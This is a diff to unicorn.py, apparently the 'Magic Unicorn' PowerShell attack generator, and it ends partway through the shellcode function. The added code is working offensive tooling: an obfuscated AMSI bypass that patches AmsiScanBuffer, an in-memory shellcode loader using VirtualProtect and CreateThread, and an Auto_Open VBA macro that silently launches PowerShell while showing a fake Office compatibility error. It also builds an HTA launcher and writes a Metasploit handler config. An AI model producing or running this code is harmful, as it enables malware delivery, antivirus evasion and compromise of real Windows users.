@@ -16,13 +16,15 @@
 # Also supports Cobalt Strike and custom shellcode delivery methods.
 #
 #
-# IMPORTANT: The way this works is by using 32-bit shellcode and a 32-bit downgrade attack.
-# That means your payloads should be a 32-bit payload, not a 64-bit. It will not work if you
-# generate a 64-bit platform. Don't fret - the 32-bit payload works on the 64-bit platform.
+# IMPORTANT: Use the --arch flag to match the shellcode architecture. The default is x86.
+# x64 shellcode requires the x64 profile.
 #
 # Special thanks to Matthew Graeber and Josh Kelley
 #
 import base64
+import argparse
+import hashlib
+import json
 import re
 import subprocess
 import sys
@@ -31,7 +33,6 @@ import shutil
 import random
 import string
 import binascii
-from functools import reduce
 
 # python 3 compat
 try: input = raw_input
@@ -60,9 +61,22 @@ except NameError: pass
 ##############################################################################################################
 
 
-# This will append the AMSI bypass code which is longer than 8191 characters. You will want to turn this off 
-# if you need a payload that works with cmd.exe as it has a character length restriction size.
+# Legacy source switch. Prefer the `--amsi off` command-line option.
+# `AMSI_MODE=inline` keeps the bypass and loader in one PowerShell process.
 AMSI_BYPASS="ON"
+
+# Generator-level controls. `--amsi`, `--profile`, `--arch`, and `--seed`
+# override these defaults without editing the source.
+AMSI_MODE="inline"
+OUTPUT_PROFILE="auto"
+TARGET_ARCH="x86"
+RANDOM_SEED=None
+LAST_SHELLCODE_BYTES=None
+LAST_SHELLCODE_SHA256=None
+LAST_LOADER_APIS=None
+CMD_LENGTH_LIMIT=8191
+POWERSHELL_LENGTH_LIMIT=32767
+
 
 # This will print out the fully decoded command for you instead of running it through the powershell obfuscated
 # code.
@@ -80,6 +94,68 @@ def generate_random_string(low, high):
 # generate a random number based on range
 def generate_random_number(low, high):
     for x in range(1): return random.randint(low,high)
+
+def set_generator_seed(seed):
+    global RANDOM_SEED
+    if seed is None:
+        return
+    RANDOM_SEED = seed
+    random.seed(seed)
+
+def unique_variable_names(count, low=3, high=4):
+    names = []
+    while len(names) < count:
+        candidate = "$" + generate_random_string(low, high)
+        if candidate not in names:
+            names.append(candidate)
+    return names
+
+def unique_plain_names(count, low=3, high=4):
+    names = []
+    while len(names) < count:
+        candidate = generate_random_string(low, high)
+        if candidate not in names:
+            names.append(candidate)
+    return names
+
+def shellcode_literal(shellcode, marker):
+    return ",".join(marker + format(byte, "02x") for byte in shellcode)
+
+def parse_shellcode_bytes(data):
+    """Return bytes from 0xNN or \\xNN shellcode text."""
+    if isinstance(data, bytes):
+        return data
+    matches = re.findall(r"(?:\\x|0x)([0-9A-Fa-f]{2})", data)
+    if not matches:
+        return None
+    try:
+        return bytes(int(value, 16) for value in matches)
+    except ValueError:
+        return None
+
+def sha256_bytes(data):
+    return hashlib.sha256(data).hexdigest()
+
+def parse_generator_options(argv):
+    parser = argparse.ArgumentParser(add_help=False)
+    parser.add_argument("--amsi", choices=["off", "inline"], default=None)
+    parser.add_argument("--profile", choices=["auto", "cmd", "powershell"], default=None)
+    parser.add_argument("--arch", choices=["x86", "x64"], default=None)
+    parser.add_argument("--seed", default=None)
+    known, remaining = parser.parse_known_args(argv)
+    return known, remaining
+
+_generator_options, _remaining_argv = parse_generator_options(sys.argv[1:])
+sys.argv = ["unicorn.py"] + _remaining_argv
+if _generator_options.amsi:
+    AMSI_MODE = _generator_options.amsi
+elif AMSI_BYPASS.lower() == "off":
+    AMSI_MODE = "off"
+if _generator_options.profile:
+    OUTPUT_PROFILE = _generator_options.profile
+if _generator_options.arch:
+    TARGET_ARCH = _generator_options.arch
+set_generator_seed(_generator_options.seed)
 
 # randomize words for evasion
 def mangle_word(word):
@@ -165,13 +241,12 @@ https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-A
 
 https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/
 
-The way this works in Unicorn is by appending the bypass technique by disabling AMSI through patching and
-disabling the AMSIScanBuffer functionality. In Unicorn this is an optional flag and can be turned off by
-editing the unicorn.py file and turning AMSI_BYPASS="ON" to "OFF". The main trade-off with this technique
-is that although it turns off AMSI when it's going to scan, it also increases the length of the payload
-substantially. If you are working with cmd.exe as a method for a one liner powershell command, this will
-increase the size of the payload more than the 8191 character size restriction. This means that when you
-go to run this, you will need to do it directly through powershell.exe and not cmd.exe. 
+Unicorn places the AMSI code and the shellcode loader in one child PowerShell process. This is important
+because an AMSI patch applies only to the process that runs it.
+
+Use `--amsi inline` to include the bypass. Use `--amsi off` to omit it. The inline mode makes the command
+larger. The `--profile cmd` option rejects commands above 8191 characters. Use `--profile powershell`
+for a 32767-character context, or use HTA, macro, or staged delivery.
 
 [*******************************************************************************************************]
 
@@ -388,24 +463,29 @@ def custom_shellcode():
                 -----Custom Shellcode Generation Method----
 
 This method will allow you to insert your own shellcode into the Unicorn attack. The PowerShell code
-will increase the stack side of the powershell.exe (through VirtualAlloc) and inject it into memory.
+will allocate memory with calloc, copy the bytes, set the memory executable with VirtualProtect, and
+start a thread with CreateThread.
 
 Note that in order for this to work, your txt file that you point Unicorn to must be formatted in the 
 following format or it will not work:
 
 0x00,0x00,0x00 and so on.
 
-Also note that there is size restrictions. The total length size of the PowerShell command cannot exceed
-the size of 8191. This is the max command line argument size limit in Windows.
+Metasploit C output with \x00 byte literals is also supported.
+
+Unicorn records the command length, architecture, seed, AMSI mode, APIs, and shellcode SHA-256 in
+unicorn_manifest.json.
 
 Usage:
 
 python unicorn.py shellcode_formatted_properly.txt shellcode
+python unicorn.py shellcode_formatted_properly.txt shellcode --arch x64 --profile cmd
+python unicorn.py shellcode_formatted_properly.txt shellcode --amsi off --profile cmd
+python unicorn.py shellcode_formatted_properly.txt shellcode --seed test-run
 
 Next simply copy the powershell command to something you have the ability for remote command execution.
 
-NOTE: THE FILE MUST PROPERLY BE FORMATTED IN A 0x00,0x00,0x00 TYPE FORMAT WITH NOTHING ELSE OTHER THAN
-YOUR SHELLCODE IN THE TXT FILE.
+NOTE: Supply shellcode that matches the selected architecture. x86 is the default.
 
 There are some caveats with this attack. Note that if your payload size is large in nature it will not
 fit in cmd.exe. That means that from a command line argument perspective if you copy and paste you will 
@@ -495,8 +575,8 @@ python unicorn.py ms
 
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v3.18 -----------------------------")
-    print("\nNative x86 powershell injection attacks on any Windows platform.")
+    print("-------------------- Magic Unicorn Attack Vector v3.19 -----------------------------")
+    print("\nPowerShell shellcode injection for x86 and x64 targets.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
     print("Credits: Matthew Graeber, Justin Elze, Chris Gates")
@@ -522,12 +602,62 @@ def gen_usage():
     print("Custom Shellcode HTA: python unicorn.py <path_to_shellcode.txt> shellcode hta (formatted 0x00 or metasploit)")
     print("Custom Shellcode Macro: python unicorn.py <path_to_shellcode.txt> shellcode macro (formatted 0x00 or metasploit)")
     print("Generate .SettingContent-ms: python unicorn.py ms")
+    print("AMSI Mode: python unicorn.py <command> --amsi off")
+    print("Profile: python unicorn.py <command> --profile cmd|powershell")
+    print("Architecture: python unicorn.py <command> --arch x86|x64")
+    print("Reproducibility: python unicorn.py <command> --seed <value>")
     print("Help Menu: python unicorn.py --help\n")
 
 # Using Rasta Mouse AMSI Bypass: https://raw.githubusercontent.com/rasta-mouse/AmsiScanBufferBypass/master/ASBBypass.ps1
 def bypass_amsi():
     amsi_string = ("""$1111 = @"\nusing System;using System.Runtime.InteropServices;public class Win32 {[DllImport("$kernel32")]public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);[DllImport("$kernel32")] public static extern IntPtr LoadLibrary(string name);[DllImport("$kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);}\n"@\nAdd-Type $1111;$2222 = [Win32]::GetProcAddress([Win32]::LoadLibrary("$amsi$dll"), "$amsi$scan$buffer");$3333 = 0;[Win32]::VirtualProtect($2222, [uint32][uint32]5, 0x40, [ref]$3333);$4444 = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3);[System.Runtime.InteropServices.Marshal]::Copy($4444, 0, $2222, 6)""")
     return amsi_string
+
+def build_amsi_bypass():
+    marker = random.choice([
+        "!", "@", "#", "%", "^", "&", "*", "(", ")", "-", "+", "=", "{", "}",
+        "|", ".", ":", ";", "<", ">", "?", "/",
+    ])
+    kernel32 = mangle_word("kernel32")
+    dll = mangle_word(".dll")
+    amsi = mangle_word("Amsi")
+    scan = mangle_word("Scan")
+    buffer = mangle_word("Buffer")
+    one, two, three, four = unique_variable_names(4, 5, 10)
+
+    amsi_string = (
+        bypass_amsi()
+        .replace("$kernel32", kernel32)
+        .replace("$dll", dll)
+        .replace("$amsi", amsi)
+        .replace("$scan", scan)
+        .replace("$buffer", buffer)
+        .replace("$1111", one)
+        .replace("$2222", two)
+        .replace("$3333", three)
+        .replace("$4444", four)
+    )
+    placeholder_one = generate_random_string(5, 10)
+    placeholder_two = generate_random_string(5, 10)
+    original_patch = "{0} = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3);".format(four)
+    encoded_patch = (
+        four
+        + ' = ("'
+        + marker + 'xB8' + placeholder_one + ', '
+        + marker + 'x' + placeholder_two + ', '
+        + marker + 'x' + marker + marker + ', '
+        + marker + 'x' + marker + '7, '
+        + marker + 'x8' + marker + ', '
+        + marker + 'xC3").replace("'
+        + placeholder_two + '", "57").replace("'
+        + marker + '", "0").replace("B8'
+        + placeholder_one + '", "B8");'
+        + four + ' = [Byte[]](' + four + ').split(",");'
+    )
+    return (
+        amsi_string
+        .replace(original_patch, encoded_patch)
+    )
 
 # this will convert any url to hexformat for download/exec payload
 def url_hexified(url):
@@ -579,73 +709,49 @@ def scramble_stuff():
     return full_exe + "," + ps_only + "," + full_wscript + "," + full_shell
 
 # generate full macro
+def vba_escape(value):
+    return value.replace('"', '""')
+
 def generate_macro(full_attack, line_length=50):
-
-    # we don't want to have AMSI_BYPASS messing with the payload itself so we strip the AMSI Bypass code to run our full powershell payload
-    if ("# actual unicorn payload") in full_attack:
-        full_attack = full_attack.split("actual unicorn payload")[1].split("\n")[1].rstrip()
-
-    # randomize macro name
     macro_rand = generate_random_string(5, 10)
-    # start of the macro
-    macro_str = ("Sub Auto_Open()\nDim {0}\n{1} = ".format(macro_rand, macro_rand))
+    shell_part1 = generate_random_string(5, 15)
+    shell_part2 = generate_random_string(5, 15)
+    shell_object = generate_random_string(5, 15)
+
     if line_length is None:
         line_length_int = 50
     else:
         line_length_int = int(line_length)
-    powershell_command_list = split_str(full_attack, line_length_int)
 
-    counter = 0
-    for line in powershell_command_list:
-        if counter == 0:
-            macro_str += " \"" + line + "\"\n"
-        if counter >= 1:
-            macro_str += macro_rand + " = " + macro_rand + " + \"" + line + "\"\n"
+    escaped_command = vba_escape(full_attack)
+    chunks = split_str(escaped_command, line_length_int)
 
-        counter = counter + 1
+    macro_str = "Sub Auto_Open()\n"
+    macro_str += "Dim {0}\n".format(macro_rand)
+    for index, chunk in enumerate(chunks):
+        if index == 0:
+            macro_str += '{0} = "{1}"\n'.format(macro_rand, chunk)
+        else:
+            macro_str += '{0} = {0} + "{1}"\n'.format(macro_rand, chunk)
 
-    # strip un-needed
-    macro_str = macro_str.replace(r's\"\"v', "sv").replace(r'e\"\"c', 'ec').replace(r'\"\"v', 'v').replace(r'g\"\"v', 'gv')
-
-    macro_str = macro_str.replace('powershell /w 1 /C "', r' /w 1 /C ""')
-    #macro_str = macro_str.replace('/w 1', "") # no longer needed
-    macro_str = macro_str.replace("')", "')\"")
-
-    # obfsucate the hell out of Shell and PowerShell
-    long_string = scramble_stuff().split(",")
-    # full powershell.exe
-    ps_long = long_string[0]
-    # ps abbreviated
-    ps_short = long_string[1][1:]
-    # wscript
-    wscript = long_string[2]
-    # shell
-    shell = long_string[3]
-
-    macro_str = macro_str.replace('powershell /w 1', ps_short + ' & " /w 1')
-    macro_str = macro_str.replace(';powershell', ';" & "' + ps_short + ' & "')
-
-    # randomized variables
-    function1 = generate_random_string(5, 15)
-    function2 = generate_random_string(5, 15)
-    function3 = generate_random_string(5, 15)
-    function4 = generate_random_string(5, 15)
-    function6 = generate_random_string(5, 15)
-
-    # our message we present to the end user - can change this to whatever you want
-    macro_message = ("This application appears to have been made with an older version of the Microsoft Office product suite. Please have the author save this document to a newer and supported format. [Error Code: -219]")
-
-    # title bar on top what it states there, you can also change this to whatever you want
-    subject_message = ("Microsoft Office (Compatibility Mode)")
- 
-    # our final product of obfsucated code - note that defender made a signature to look for WScript.Run with a compacted string with a "False" terminal window. Just needed to split it out into two lines :P
-    macro_str += ("""\n\nDim {0}\n{0} = {1}\nDim {2}\n{2} = {3}\nDim {4}\n{4} = {2} & "." & {0}\nDim {5}\nSet {5} = VBA.CreateObject({4})\nDim waitOnReturn As Boolean: waitOnReturn = False\nDim windowStyle As Integer: windowStyle = 0\nDim {6}\n{6} = {7} & " "\n{5}.Run {6} & {8}, windowStyle, waitOnReturn\n\nDim title As String\ntitle = "{10}"\nDim msg As String\nDim intResponse As Integer\nmsg = "{9}"\nintResponse = MsgBox(msg, 16, title)\nApplication.Quit\nEnd Sub""".format(function1, shell, function2, wscript, function3, function4, function6, ps_long, macro_rand, macro_message, subject_message))
-
-    # strip and fix issues
-    macro_str = macro_str.replace("''", "")
-
+    macro_str += "Dim {0}\n".format(shell_part1)
+    macro_str += '{0} = "WScript"\n'.format(shell_part1)
+    macro_str += "Dim {0}\n".format(shell_part2)
+    macro_str += '{0} = ".Shell"\n'.format(shell_part2)
+    macro_str += "Dim {0}\n".format(shell_object)
+    macro_str += "Set {0} = CreateObject({1} & {2})\n".format(
+        shell_object, shell_part1, shell_part2
+    )
+    macro_str += "{0}.Run {1}, 0, False\n".format(shell_object, macro_rand)
+    macro_str += "Dim title As String\n"
+    macro_str += 'title = "Microsoft Office (Compatibility Mode)"\n'
+    macro_str += "Dim msg As String\n"
+    macro_str += 'msg = "This application appears to have been made with an older version of the Microsoft Office product suite. Please have the author save this document to a newer and supported format. [Error Code: -219]"\n'
+    macro_str += "Dim intResponse As Integer\n"
+    macro_str += "intResponse = MsgBox(msg, 16, title)\n"
+    macro_str += "Application.Quit\n"
+    macro_str += "End Sub\n"
     return macro_str
-
 
 # generate Matthew Graeber's (Matt rocks) attack for binary to cert format #KeepMattHappy
 # - https://gist.github.com/mattifestation/47f9e8a431f96a266522
@@ -679,10 +785,8 @@ def gen_cert_attack(filename):
 def gen_hta_attack(command):
     # HTA code here
 
-    # when AMSI_BYPASS is on, the attack contains comment lines and multiple
-    # powershell commands separated by newlines. Raw newlines/comments inside
-    # the JScript string would break the HTA, so split them out and give each
-    # command its own run() call (AMSI bypass runs first, then the payload).
+    # Each generated attack is one command. AMSI setup and the shellcode loader
+    # execute in that command's child PowerShell process.
     commands = [line for line in command.split("\n") if line.strip() and not line.lstrip().startswith("#")]
 
     # generate random variable names for vba
@@ -704,9 +808,8 @@ def gen_hta_attack(command):
     main1 = ("""<script>\n{0} = "WS";\n{1} = "crip";\n{2} = "t.Sh";\n{3} = "ell";\n{4} = ({0} + {1} + {2} + {3});\n{6} = "pow";\n{7} = "ersh";\n{8} = "ell";\n{9} = ({6} + {7} + {8});\n{5}=new ActiveXObject({4});\n""".format(shell_split1, shell_split2, shell_split3, shell_split4, shell_split5, hta_rand, ps_split1, ps_split2, ps_split3, ps_split4))
     main2 = ""
     for attack_command in commands:
-        attack_command = attack_command.replace("'", "\\'")
-        attack_command = attack_command.replace("powershell", "{0} + '".format(ps_split4)).replace(";{0}".format(ps_split4), ";' + {0}".format(ps_split4))
-        main2 += """{0}.run({1}', 0);\n""".format(hta_rand, attack_command)
+        attack_command = attack_command.replace("\\", "\\\\").replace("'", "\\'")
+        main2 += """{0}.run('{1}', 0);\n""".format(hta_rand, attack_command)
     main2 += "window.close();\n</script>"
     html_code = ("""<iframe id="frame" src="Launcher.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>""")
 
@@ -727,18 +830,15 @@ def gen_hta_attack(command):
 
 # format metasploit shellcode
 def format_metasploit(data):
-    # start to format this a bit to get it ready
-    repls = {';': '', ' ': '', '+': '', '"': '', '\n': '', 'buf=': '', 'Found 0 compatible encoders': '','unsignedcharbuf[]=': ''}
-    #data = data.decode()
-    data = reduce(lambda a, kv: a.replace(*kv),iter(repls.items()), data).rstrip()
-    if len(data) < 1:
+    parsed = parse_shellcode_bytes(data)
+    if not parsed:
         print("[!] Critical: It does not appear that your shellcode is formatted properly. Shellcode should be in a 0x00,0x01 format or a Metasploit format.")
         print("[!] Example: msfvenom -p LHOST=192.168.5.5 LPORT=443 -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai -f c")
         print("[!] Also ensure your syntax for unicorn is correct. Missing IP address, port, etc. etc. will cause this error.")
         print("Exiting....")
         sys.exit(1)
 
-    return data
+    return ",".join("0x{0:02x}".format(byte) for byte in parsed)
 
 
 # generate the actual shellcode through msf
@@ -809,192 +909,92 @@ def generate_shellcode(payload, ipaddr, port):
     # return the metasploit data
     return format_metasploit(data)
 
-# chunk continuous 0xNN shellcode (e.g. 0xfc0xe8) into comma separated
-# 0xfc,0xe8 format expected by the powershell payload
-def chunk_shellcode(shellcode):
-    counter = 0
-    floater = ""
-    newdata = ""
-    for line in shellcode:
-        floater += line
-        counter += 1
-        if counter == 4:
-            newdata = newdata + floater + ","
-            floater = ""
-            counter = 0
+# generate the in-process shellcode loader. `format_payload` handles the final
+# encoded command and the architecture-specific PowerShell child process.
+def gen_shellcode_attack(payload, ipaddr, port, copy_mode=None):
+    global LAST_SHELLCODE_BYTES, LAST_SHELLCODE_SHA256, LAST_LOADER_APIS
 
-    return newdata[:-1]
-
-# generate shellcode attack and replace hex
-def gen_shellcode_attack(payload, ipaddr, port):
-    # regular payload generation stuff
-    # generate our shellcode first
-    if ipaddr != ("cobaltstrike"):
-        shellcode = generate_shellcode(payload, ipaddr, port).rstrip()
-        # sub in \x for 0x
-        shellcode = re.sub("\\\\x", "0x", shellcode)
-        # here's our shellcode prepped and ready to go
-        shellcode = chunk_shellcode(shellcode)
-
-        # if we aren't using download/exec
+    if ipaddr != "cobaltstrike":
+        shellcode_text = generate_shellcode(payload, ipaddr, port).rstrip()
+        shellcode = parse_shellcode_bytes(shellcode_text)
         if not "url=" in ipaddr:
-            # write out rc file
-            write_file("unicorn.rc", "use multi/handler\nset payload {0}\nset LHOST {1}\nset LPORT {2}\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo false\nset AutoLoadStdapi false\nexploit -j\n".format(payload, ipaddr, port))
+            write_file(
+                "unicorn.rc",
+                "use multi/handler\nset payload {0}\nset LHOST {1}\nset LPORT {2}\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo false\nset AutoLoadStdapi false\nexploit -j\n".format(payload, ipaddr, port),
+            )
+    else:
+        shellcode = parse_shellcode_bytes(payload)
 
-    # switch variable to be shellcode for formatting
-    if ipaddr == "cobaltstrike":
-        shellcode = payload
-        # normalize metasploit-style shellcode (\xfc continuous hex) the same way
-        # as the metasploit path - without this the payload cannot split the bytes
-        shellcode = re.sub("\\\\x", "0x", shellcode)
-        if "," not in shellcode:
-            shellcode = chunk_shellcode(shellcode)
+    if not shellcode:
+        print("[!] Critical: no shellcode bytes were found. Use 0xNN, 0xNN or Metasploit \\xNN format.")
+        sys.exit(1)
 
-    # added random vars before and after to change strings
-    # this is a hack job but it works in checking to see if there are any variable name conflicts. While random, can happen when using only 2 randomized characters for char lenght. 
-    while True:
-        varcheck = ("")
-        reroll = False
-        var1 = "$" + generate_random_string(2, 2) # $1
-        varcheck = var1
-        var2 = "$" + generate_random_string(2, 2) # $c
-        if var2.lower() in varcheck.lower():
-            reroll = True
-        varcheck = varcheck + var2
-        var3 = "$" + generate_random_string(2, 2) # $2 - powershell
-        if var3.lower() in varcheck.lower():
-            reroll = True
-        varcheck = varcheck + var3
-        var4 = "$" + generate_random_string(2, 2) # $3
-        if var4.lower() in varcheck.lower():
-            reroll = True
-        varcheck = varcheck + var4
-        var5 = "$" + generate_random_string(2, 2) # $x
-        if var5.lower() in varcheck.lower():
-            reroll = True
-        varcheck = varcheck + var5
-        var6 = "$" + generate_random_string(2, 2) # $t
-        if var6.lower() in varcheck.lower():
-            reroll = True
-        varcheck = varcheck + var6
-        var7 = "$" + generate_random_string(2, 2) # $h
-        if var7.lower() in varcheck.lower():
-            reroll = True
-        varcheck = varcheck + var7
-        var8 = "$" + generate_random_string(2, 2) # $z
-        if var8.lower() in varcheck.lower():
-            reroll = True
-        varcheck = varcheck + var8
-        var9 = "$" + generate_random_string(2, 2) # $g
-        if var9.lower() in varcheck.lower():
-            reroll = True
-        varcheck = varcheck + var9
-        var10 = "$" + generate_random_string(2, 2) # $i
-        if var10.lower() in varcheck.lower():
-            reroll = True
-        varcheck = varcheck + var10
-        var11 = "$" + generate_random_string(2, 2) # $w
-        if var11.lower() in varcheck.lower():
-            reroll = True
-        varcheck = varcheck + var11
-        var12 = (str(generate_random_number(1001,1010)))
-        if var12.lower() in varcheck.lower():
-            reroll = True
-        varcheck = varcheck + var12
-        var13 = "$" + generate_random_string(2, 2) # $4 - Windows
-        if var13.lower() in varcheck.lower():
-            reroll = True
-        varcheck = varcheck + var13
-        var14 = generate_random_string(3, 3) # $allocreplace
-        if var14.lower() in varcheck.lower():
-            reroll = True
-        varcheck = varcheck + var14
-        tempvar_withoutdollar = generate_random_string(3, 3) # $tempvar
-        var15 = "$" + tempvar_withoutdollar
-        if var15.lower() in varcheck.lower():
-            reroll = True
-        varcheck = varcheck + var15
+    LAST_SHELLCODE_BYTES = shellcode
+    LAST_SHELLCODE_SHA256 = sha256_bytes(shellcode)
 
-        var16 = generate_random_string(3,3) # $createthread
-        if var16.lower() in varcheck.lower():
-            reroll = True
-        varcheck = varcheck + var16
+    variables = unique_variable_names(9)
+    source, encoded, type_name, allocation, old_protect, index, thread_id, length, temporary = variables
+    plain_names = unique_plain_names(2, 4, 8)
+    class_name = "U" + plain_names[0]
+    namespace = "U" + plain_names[1]
 
+    marker = random.choice([
+        "!", "@", "#", "%", "^", "&", "*", "(", ")", "-", "+", "=", "{", "}",
+        "|", ".", ":", ";", "<", ">", "?", "/",
+    ])
+    shellcode_string = shellcode_literal(shellcode, marker)
+    allocation_size = max(len(shellcode), 0x1000)
 
-        var17 = "$" + generate_random_string(3,3) # $yyyy
-        if var17.lower() in varcheck.lower():
-            reroll = True
-        varcheck = varcheck + var17
-
-        var18 = generate_random_string(3,3) # $Win32
-        if var18.lower() in varcheck.lower():
-            reroll = True
-        varcheck = varcheck + var18
-
-        var19 = generate_random_string(3,3) # $CreateThread
-        if var19.lower() in varcheck.lower():
-            reroll = True
-        varcheck = varcheck + var19
-
-        if reroll == True: print("[*] Great Scott!! There was a variable conflict. This happens. It's OK Marty. Rerolling variable names until we get a solid set to remove conflicting names.")
-        if reroll == False: break
-
-    # generate random service name from win32 - defender was looking from name win32 + 0x00 length inside of byte array
-    randomize_service_name = generate_random_string(2,2)
-
-    # random var name  
-    full_command = generate_random_string(2,2)
-
-    # randomize kernel32.dll and msvcrt.dll
-    kernel = mangle_word("kernel32.dll")
     msv = mangle_word("msvcrt.dll")
-    true_mangle = mangle_word("True")
-    # here we do a little magic to get around AMSI, no more cat and mouse game here by chunking of shellcode, it's not needed since Defender and AMSI is still signature driven primarily
-    random_symbols = ['!', '@', '#', '%', '^', '&', '*', '(', ')', '-', '+', '=', '{', '}', '|', '.', ':', ';', '<', '>', '?', '/']
-    random_symbols = ['}']
-    mangle_shellcode = (random.choice(random_symbols))
+    kernel = mangle_word("kernel32.dll")
 
-    #mangle_shellcode = generate_random_string(1, 1).upper()
-    shellcode = shellcode.replace("0x", mangle_shellcode)
+    if copy_mode is None:
+        copy_mode = random.choice(["memset", "marshal"])
+    if copy_mode == "memset":
+        memset_import = '[DllImport("%MSV%")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'
+        copy_code = 'for(%INDEX%=0;%INDEX% -lt %SHELLCODE%.Length;%INDEX%++){%TYPE%::memset([IntPtr](%ALLOCATION%.ToInt32()+%INDEX%), %SHELLCODE%[%INDEX%], 1)}'
+        LAST_LOADER_APIS = ["calloc", "memset", "VirtualProtect", "CreateThread"]
+    else:
+        memset_import = ""
+        copy_code = '[System.Runtime.InteropServices.Marshal]::Copy(%SHELLCODE%, 0, %ALLOCATION%, %SHELLCODE%.Length)'
+        LAST_LOADER_APIS = ["calloc", "Marshal.Copy", "VirtualProtect", "CreateThread"]
 
-    # mangle 0x
-    randomized_byte_name = generate_random_string(3,4)
+    loader = r'''%SOURCE%='[DllImport(("%MSV%"))]public static extern IntPtr calloc(uint dwSize, uint amount);[DllImport("%KERNEL%")]public static extern bool VirtualProtect(IntPtr lpStartAddress, uint dwSize, uint flNewProtect, out uint %OLD%);%MEMSET_IMPORT%[DllImport("%KERNEL%")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr %THREAD_PARAM%);';%SHELLCODE%="%SHELLCODE_BYTES%";%TYPE%=Add-Type -pass -m %SOURCE% -Name "%CLASS_NAME%" -names "%NAMESPACE%";[byte[]]%SHELLCODE% = %SHELLCODE%.replace("%MARKER%", "0x").Split(",");%LENGTH%=0x%ALLOC_SIZE%;%ALLOCATION%=%TYPE%::calloc(%LENGTH%, 1);[UInt64]%TEMP% = 0;%COPY_CODE%;%TYPE%::VirtualProtect(%ALLOCATION%, %LENGTH%, 0x40, [Ref]%TEMP%);%THREAD_VAR%=[IntPtr]::Zero;%TYPE%::CreateThread([IntPtr]::Zero, 0, %ALLOCATION%, [IntPtr]::Zero, 0, [Ref]%THREAD_VAR%);'''
 
-    # randomize syswow64 var
-    syswow_var = generate_random_string(3,4)
+    replacements = {
+        "%SOURCE%": source,
+        "%MEMSET_IMPORT%": memset_import,
+        "%MSV%": msv,
+        "%KERNEL%": kernel,
+        "%OLD%": old_protect[1:],
+        "%THREAD_PARAM%": thread_id[1:],
+        "%THREAD_VAR%": thread_id,
+        "%COPY_CODE%": copy_code,
+        "%SHELLCODE%": encoded,
+        "%SHELLCODE_BYTES%": shellcode_string,
+        "%TYPE%": type_name,
+        "%CLASS_NAME%": class_name,
+        "%NAMESPACE%": namespace,
+        "%MARKER%": marker,
+        "%LENGTH%": length,
+        "%ALLOC_SIZE%": format(allocation_size, "x"),
+        "%ALLOCATION%": allocation,
+        "%TEMP%": temporary,
+        "%INDEX%": index,
+    }
+    for token, value in replacements.items():
+        loader = loader.replace(token, value)
 
-    # randomize noe xit
-    noexit = generate_random_string(3,4)
-
-    truevalue = generate_random_string(3,4)
-
-    # syswow split for obfuscation
-    syswowsplit_1 = generate_random_string(3,4)
-    syswowsplit_2 = generate_random_string(3,4)
-
-    # one line shellcode injection with native x86 shellcode
-    powershell_code = (r'''$1111='$tttt=''[DllImport(("%s"))]public static extern IntPtr calloc(uint dwSize, uint amount);[DllImport("%s")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("%s")]public static extern IntPtr VirtualProtect(IntPtr lpStartAddress, uint dwSize, uint flNewProtect, out uint %s);[DllImport("%s")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$zzzz="%s";$wwww=Add-Type -pass -m $tttt -Name "%s" -names $Win32;[byte[]]$zzzz = $zzzz.replace("SHELLCODE_STUB","$randomized_byte_namex").replace("$randomized_byte_name", "0").Split(",");$gggg=0x$randstack;if ($zzzz.L -gt 0x$randstack){$gggg=$zzzz.L};$xxxx=$wwww::calloc(0x$randstack, 1);[UInt64]$tempvar = 0;for($iiii=0;$iiii -le($zzzz.Length-1);$iiii++){$wwww::memset([IntPtr]($xxxx.ToInt32()+$iiii), $zzzz[$iiii], 1)};$wwww::VirtualProtect($xxxx, 0x$randstack, 0x40, [Ref]$tempvar);$yyyy=[int]0x00;$wwww::CreateThread([int]0,$yyyy,$xxxx,0,0,1-1);';$hhhh=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($1111));$2222="powershell";$4444="Windows";$5555 = "C:\$4444\$syswowsplit_1$syswowsplit_2\$4444$2222\v1.0\$2222";$5555 = $5555.replace("$syswowsplit_1", "sys");$5555 = $5555.replace("$syswowsplit_2", "wow64");$$truevalue = '%s';if([environment]::Is64BitOperatingSystem -eq '$$truevalue'){$2222= $5555};$fullcommand=" $2222 $noexit $hhhh";$fullcommand=$fullcommand.replace("$noexit", "-noexit -e");iex $fullcommand''' % (msv,kernel,kernel,tempvar_withoutdollar,msv,shellcode,randomize_service_name,true_mangle)).replace("SHELLCODE_STUB", mangle_shellcode)
-
-    # run it through a lame var replace
-    powershell_code = powershell_code.replace("$1111", var1).replace("$cccc", var2).replace(
-        "$2222", var3).replace("$3333", var4).replace("$xxxx", var5).replace("$tttt", var6).replace(
-        "$hhhh", var7).replace("$zzzz", var8).replace("$gggg", var9).replace("$iiii", var10).replace(
-        "$wwww", var11).replace("$randstack", var12).replace("$4444", var13).replace("$tempvar", var15).replace(
-        "$yyyy", var17).replace("$Win32", var18).replace("$randomized_byte_name", randomized_byte_name).replace(
-        "$fullcommand", "$" + full_command).replace("$5555", "$" + syswow_var).replace("$noexit", noexit).replace(
-        "$truevalue", truevalue).replace("$syswowsplit_1", syswowsplit_1).replace("$syswowsplit_2", syswowsplit_2)
-
-    # if we have PRINT_DECODED="ON" this will spit out the raw powershell code for you
     if PRINT_DECODED.lower() == "on":
-        if AMSI_BYPASS.lower() == "on":
